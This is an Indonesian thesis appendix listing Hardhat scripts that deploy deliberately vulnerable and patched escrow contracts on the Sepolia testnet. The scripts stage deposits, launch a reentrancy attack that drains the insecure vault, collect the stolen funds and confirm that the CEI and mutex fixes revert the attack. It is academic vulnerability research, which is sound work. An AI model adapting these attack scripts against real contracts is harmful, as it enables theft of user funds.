# Lampiran 16. Skrip Deployment dan Skenario Validasi On-chain di Sepolia

> **Cross-reference:** Mendukung **Bab 3.5.4 (Validasi On-chain di Sepolia Testnet)**, **Bab 4.2.3 (Validasi On-chain)**, dan **Lampiran 6 (Bukti transaksi)**.
>
> **Repositori:** [github.com/nurcahyapriantoro/skripsi-final/tree/main/scripts](https://github.com/nurcahyapriantoro/skripsi-final/tree/main/scripts)
>
> Lampiran ini memuat skrip yang digunakan untuk menjalankan skenario persis Bab 3.6 di Sepolia Testnet. Skrip `sepolia_skripsi_scenario.js` adalah skrip utama yang menghasilkan TX hashes pada Lampiran 6.

---

## 16.1 `sepolia_skripsi_scenario.js` — Skenario Persis Bab 3.6 (Skrip Utama)

**Lokasi:** [`scripts/sepolia_skripsi_scenario.js`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/scripts/sepolia_skripsi_scenario.js)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/scripts/sepolia_skripsi_scenario.js
**Tujuan:** Menjalankan deployment 3 kontrak (InsecureVault, SecureVault, Attacker) + skenario honeypot 2,4 ETH + serangan + validasi mitigasi CEI.

```javascript
/**
 * sepolia_skripsi_scenario.js
 * Menjalankan PERSIS skenario Bab 3.6 skripsi di Sepolia Testnet:
 *   Pembeli A  : 1.5 ETH (simulasi 1 ton komoditas)
 *   Pembeli B  : 0.8 ETH (pembayaran parsial)
 *   Penyerang  : 0.1 ETH (deposit minimal sebagai penjual)
 *   Total Vault: 2.4 ETH
 */

const { ethers } = require("hardhat");

// ── JUMLAH ETH PERSIS SESUAI BAB 3.6 SKRIPSI ──────────────────────────
const BUYER_A_DEPOSIT = ethers.parseEther("1.5");
const BUYER_B_DEPOSIT = ethers.parseEther("0.8");
const ATTACKER_ENTRY  = ethers.parseEther("0.1");
const TOTAL_HONEYPOT  = BUYER_A_DEPOSIT + BUYER_B_DEPOSIT;
const TOTAL_VAULT     = TOTAL_HONEYPOT + ATTACKER_ENTRY;

// ── HELPER: kirim tx, log gas detail ──────────────────────────────────
async function waitTx(txPromise, label) {
  const tx = await txPromise;
  const r  = await tx.wait();
  const gasCostEth = ethers.formatEther(r.gasUsed * r.gasPrice);
  console.log(`    ▸ ${label}`);
  console.log(`      Gas: ${r.gasUsed.toLocaleString()} | Price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei | Biaya: ${gasCostEth} ETH | Hash: ${r.hash.slice(0,22)}...`);
  return r;
}

async function main() {
  const [wallet] = await ethers.getSigners();
  const fakeSeller = ethers.Wallet.createRandom().address;

  console.log("═══════════════════════════════════════════════════════════════");
  console.log("   VALIDASI SEPOLIA — SKENARIO SKRIPSI BAB 3.6 (EXACT AMOUNTS)");
  console.log("═══════════════════════════════════════════════════════════════");
  console.log(`Wallet  : ${wallet.address}`);
  console.log(`Balance : ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH`);
  console.log(`FakeSeller (korban): ${fakeSeller}`);

  // ═══ FASE 1: DEPLOY KONTRAK ═══
  console.log("═══ FASE 1: DEPLOY KONTRAK ═══════════════════════════════════");

  const InsecureVault = await ethers.getContractFactory("InsecureVault");
  const insecureVault = await InsecureVault.deploy();
  await insecureVault.waitForDeployment();
  const insecureAddr = await insecureVault.getAddress();

  const SecureVault = await ethers.getContractFactory("SecureVault");
  const secureVault = await SecureVault.deploy();
  await secureVault.waitForDeployment();
  const secureAddr = await secureVault.getAddress();

  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();

  const attacker2 = await Attacker.deploy(secureAddr);
  await attacker2.waitForDeployment();
  const attacker2Addr = await attacker2.getAddress();

  // ═══ FASE 2: SETUP HONEYPOT InsecureVault ═══
  console.log("═══ FASE 2: SETUP HONEYPOT InsecureVault (Bab 3.6.1) ════════");

  await insecureVault.createOrder(fakeSeller);
  await insecureVault.depositFunds(0, { value: BUYER_A_DEPOSIT });
  await insecureVault.confirmDelivery(0);

  await insecureVault.createOrder(fakeSeller);
  await insecureVault.depositFunds(1, { value: BUYER_B_DEPOSIT });
  await insecureVault.confirmDelivery(1);

  await insecureVault.createOrder(attackerAddr);
  await insecureVault.depositFunds(2, { value: ATTACKER_ENTRY });
  await insecureVault.confirmDelivery(2);

  // ═══ FASE 3: SERANGAN REENTRANCY ═══
  console.log("═══ FASE 3: SERANGAN REENTRANCY (Bab 3.6.1) ════════════════");

  const attackTx = await attacker.attack({ gasLimit: 700000 });
  const rAttack  = await attackTx.wait();
  const reentryCount = await attacker.getReentrancyCount();
  const ivVaultAfter  = await insecureVault.getContractBalance();

  // Exfiltrate
  await attacker.collectFunds();

  // ═══ FASE 4: UJI PENCEGAHAN CEI (SecureVault) ═══
  console.log("═══ FASE 4: UJI CEI SecureVault (Bab 3.6.2) ═══");

  await secureVault.createOrder(fakeSeller);
  await secureVault.depositFunds(0, { value: BUYER_A_DEPOSIT });
  await secureVault.confirmDelivery(0);

  await secureVault.createOrder(fakeSeller);
  await secureVault.depositFunds(1, { value: BUYER_B_DEPOSIT });
  await secureVault.confirmDelivery(1);

  await secureVault.createOrder(attacker2Addr);
  await secureVault.depositFunds(2, { value: ATTACKER_ENTRY });
  await secureVault.confirmDelivery(2);

  try {
    await attacker2.attack({ gasLimit: 700000 });
  } catch (err) {
    // Expected: CEI reverts the attack
  }

  // ═══ RINGKASAN AKHIR ═══
  console.log("═══════════════════════════════════════════════════════════════");
  console.log("   RINGKASAN HASIL — SKENARIO BAB 3.6 SKRIPSI (SEPOLIA)");
  console.log("═══════════════════════════════════════════════════════════════");
  console.log(`  CONTRACT ADDRESSES:`);
  console.log(`    InsecureVault            : ${insecureAddr}`);
  console.log(`    SecureVault              : ${secureAddr}`);
  console.log(`    Attacker (→InsecureVault): ${attackerAddr}`);
  console.log(`    Attacker (→SecureVault)  : ${attacker2Addr}`);
}

main().catch(console.error);
```

**Penjelasan blok:**
- **L13–17 (Konstanta ETH):** Persis Tabel 4 skripsi (1,5 + 0,8 + 0,1 ETH).
- **L20–27 (`waitTx` helper):** Logging detail gas + hash setiap TX.
- **L52–70 (Fase 1 Deploy):** Deploy 4 kontrak (Insecure, Secure, 2 Attacker instances).
- **L74–88 (Fase 2 Honeypot):** Setup 3 order di InsecureVault.
- **L92–97 (Fase 3 Serangan):** `attack({gasLimit: 700000})` cukup untuk 24 loop.
- **L101–124 (Fase 4 Uji CEI):** Serangan ke SecureVault — diharapkan *revert*.

---

## 16.2 `deploy_testnet.js` — Deploy Kontrak ke Sepolia

**Lokasi:** [`scripts/deploy_testnet.js`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/scripts/deploy_testnet.js)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/scripts/deploy_testnet.js
**Tujuan:** Deploy keempat kontrak ke Sepolia dan cetak alamatnya.

```javascript
const { ethers } = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();

  console.log("Deploying contracts with account:", deployer.address);
  console.log("Deployer balance:", ethers.formatEther(await ethers.provider.getBalance(deployer.address)));

  const InsecureVault = await ethers.getContractFactory("InsecureVault");
  const insecureVault = await InsecureVault.deploy();
  await insecureVault.waitForDeployment();
  console.log("InsecureVault deployed to:", await insecureVault.getAddress());

  const SecureVault = await ethers.getContractFactory("SecureVault");
  const secureVault = await SecureVault.deploy();
  await secureVault.waitForDeployment();
  console.log("SecureVault deployed to:", await secureVault.getAddress());

  const MutexVault = await ethers.getContractFactory("MutexVault");
  const mutexVault = await MutexVault.deploy();
  await mutexVault.waitForDeployment();
  console.log("MutexVault deployed to:", await mutexVault.getAddress());

  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(await insecureVault.getAddress());
  await attacker.waitForDeployment();
  console.log("Attacker deployed to:", await attacker.getAddress());

  console.log("\n=== All contracts deployed successfully ===");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

**Catatan:** Output alamat disimpan untuk langkah `run_attack_testnet.js`.

---

## 16.3 `run_attack_testnet.js` — Eksekusi Serangan di Sepolia

**Lokasi:** [`scripts/run_attack_testnet.js`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/scripts/run_attack_testnet.js)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/scripts/run_attack_testnet.js
**Tujuan:** Setup honeypot kecil (0,0001 + 0,00005 + 0,00001 ETH) + eksekusi serangan + exfiltrasi.

```javascript
const { ethers } = require("hardhat");

const INsecure_Vault_ADDR = process.env.INsecure_Vault_ADDR || "";
const ATTACKER_ADDR = process.env.ATTACKER_ADDR || "";

const BUYER_A_DEPOSIT = ethers.parseEther("0.0001");
const BUYER_B_DEPOSIT = ethers.parseEther("0.00005");
const ATTACKER_DEPOSIT = ethers.parseEther("0.00001");

function log(msg) {
  console.log(`[${new Date().toISOString().slice(11, 19)}] ${msg}`);
}

async function main() {
  if (!INsecure_Vault_ADDR || !ATTACKER_ADDR) {
    console.error("ERROR: Set INsecure_Vault_ADDR and ATTACKER_ADDR in .env");
    process.exit(1);
  }

  const [wallet] = await ethers.getSigners();
  const insecureVault = await ethers.getContractAt("InsecureVault", INsecure_Vault_ADDR);
  const attacker = await ethers.getContractAt("Attacker", ATTACKER_ADDR);

  // Phase 1: Setup honeypot
  const seller = ethers.Wallet.createRandom().address;
  await insecureVault.createOrder(seller);
  await insecureVault.depositFunds(0, { value: BUYER_A_DEPOSIT });
  await insecureVault.confirmDelivery(0);
  await insecureVault.createOrder(seller);
  await insecureVault.depositFunds(1, { value: BUYER_B_DEPOSIT });
  await insecureVault.confirmDelivery(1);
  await insecureVault.createOrder(ATTACKER_ADDR);
  await insecureVault.depositFunds(2, { value: ATTACKER_DEPOSIT });
  await insecureVault.confirmDelivery(2);

  // Phase 2: Execute attack
  const tx = await attacker.attack();
  await tx.wait();

  // Phase 3: Exfiltrate
  const vaultBalanceAfter = await insecureVault.getContractBalance();
  const attackerBalAfter = await attacker.getAttackerBalance();
  const illegalProfit = attackerBalAfter - ATTACKER_DEPOSIT;

  if (illegalProfit > 0n) {
    await attacker.collectFunds();
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

**Penjelasan:**
- **Konstanta kecil (L6–8):** 0,0001 + 0,00005 + 0,00001 = 0,00016 ETH honeypot. Dipakai untuk pengujian cepat tanpa menghabiskan saldo Sepolia.
- **Env vars (L3–4):** `INsecure_Vault_ADDR` dan `ATTACKER_ADDR` harus di-set di `.env` (diperoleh dari output `deploy_testnet.js`).

---

## 16.4 `sepolia_attack_only.js` — Serangan ke Kontrak Existing

**Lokasi:** [`scripts/sepolia_attack_only.js`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/scripts/sepolia_attack_only.js)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/scripts/sepolia_attack_only.js
**Tujuan:** Menyerang kontrak yang sudah ter-deploy (mis. dari eksperimen sebelumnya).

**Cuplikan kunci (baris 1–60):**

```javascript
// Attack existing contracts on Sepolia (deployed by sepolia_proposal.js)
const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [wallet] = await ethers.getSigners();
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Balance: ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH\n`);

  const insecureAddr = "0x33a5ea6A1d427E42cD89C064b5ecae4600117826";
  const secureAddr = "0x6b7C6368A2E8db481159E87bdD1Bf348935a4ea8";

  const insecure = await ethers.getContractAt("InsecureVault", insecureAddr);
  const Attacker = await ethers.getContractFactory("Attacker");

  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();
  let r = await attacker.deploymentTransaction().wait();
  console.log(`New Attacker: ${attackerAddr} (${r.gasUsed} gas)\n`);

  const vBal = await insecure.getContractBalance();
  console.log(`Vault balance: ${ethers.formatEther(vBal)} ETH`);

  const existingBal = await insecure.getBalance(attackerAddr);
  console.log(`Existing balance for attacker: ${ethers.formatEther(existingBal)} ETH`);

  if (existingBal === 0n) {
    // Setup new attacker as seller
    const fakeSeller = ethers.Wallet.createRandom().address;
    let tx = await insecure.createOrder(fakeSeller);
    await tx.wait();
    tx = await insecure.depositFunds(0, { value: ethers.parseEther("1.5") });
    await tx.wait();
    tx = await insecure.confirmDelivery(0);
    await tx.wait();
    // ... dst untuk Buyer B dan Attacker entry
  }
}
```

**Catatan:** Alamat `insecureAddr` dan `secureAddr` di-hardcode untuk deployment sebelumnya. Untuk eksperimen saat ini, gunakan `sepolia_skripsi_scenario.js` (L16.1) yang melakukan deployment fresh.

---

## 16.5 `sepolia_direct.js` — Ethers.js Langsung (Tanpa Hardhat Wrapper)

**Lokasi:** [`scripts/sepolia_direct.js`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/scripts/sepolia_direct.js)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/scripts/sepolia_direct.js
**Tujuan:** Menjalankan skrip tanpa Hardhat runtime, menggunakan `ethers.js` langsung.

**Cuplikan kunci (baris 1–30):**

```javascript
// Direct ethers.js test on Sepolia - no Hardhat wrapper
const { ethers } = require("ethers");
const fs = require("fs");
const path = require("path");

async function main() {
  // Load .env
  require("dotenv").config();
  const PRIVATE_KEY = process.env.PRIVATE_KEY.startsWith("0x")
    ? process.env.PRIVATE_KEY
    : "0x" + process.env.PRIVATE_KEY;
  const RPC_URL = process.env.SEPOLIA_RPC_URL;

  const provider = new ethers.JsonRpcProvider(RPC_URL, 11155111, {
    staticNetwork: true,
  });

  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  console.log(`Wallet: ${wallet.address}`);

  // ... deployment + attack
}

main().catch(console.error);
```

**Kegunaan:** Berguna untuk deployment ke mainnet atau chain lain tanpa konfigurasi Hardhat. **Tidak digunakan** dalam eksperimen skripsi (kami pakai `sepolia_skripsi_scenario.js`).

---

## 16.6 Skrip Pendukung Lainnya

| Skrip | Tujuan | Dipakai di skripsi? |
|-------|--------|---------------------|
| `sepolia_full_test.js` | Pipeline lengkap deploy + attack + mitigasi | Eksplorasi |
| `sepolia_minimal.js` | Versi minimal (deploy Insecure + Attacker + attack saja) | Debugging |
| `sepolia_proposal.js` | Skenario proposal kolokium (honeypot 2,3 ETH) | Eksplorasi |
| `sepolia_attack_mutex.js` | Serangan ke MutexVault (ekspektasi: revert) | Validasi Mutex |
| `cei_test_sepolia.js` | Uji CEI di Sepolia (utilitas) | Debugging |

Skrip `sepolia_skripsi_scenario.js` adalah **satu-satunya skrip yang menghasilkan TX hashes pada Lampiran 6** (alamat InsecureVault, SecureVault, MutexVault, dan TX Attacker ke masing-masing).

— **Akhir Lampiran 16** —
